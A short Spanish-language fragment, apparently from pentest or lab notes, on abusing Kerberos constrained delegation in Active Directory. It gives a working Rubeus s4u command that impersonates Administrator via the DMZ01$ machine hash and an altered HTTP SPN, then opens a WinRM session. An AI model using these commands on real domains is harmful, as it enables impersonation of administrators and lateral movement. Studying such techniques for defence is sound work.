...
`DMZ01$` tiene delegation hacia `www/WS01.DOMAIN.local`. Se modifica el SPN usando `/altservice:HTTP` para acceder vía WinRM:

```powershell
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.DOMAIN.local /altservice:HTTP /user:DMZ01$ /rc4:<NTHASH_DMZ01$> /ptt
```
...
```powershell
# WinRM / PSRemoting
Enter-PSSession ws01.DOMAIN.local
...
`beth.richards` tiene delegation hacia `TERMSRV/DC01.DOMAIN.LOCAL`:
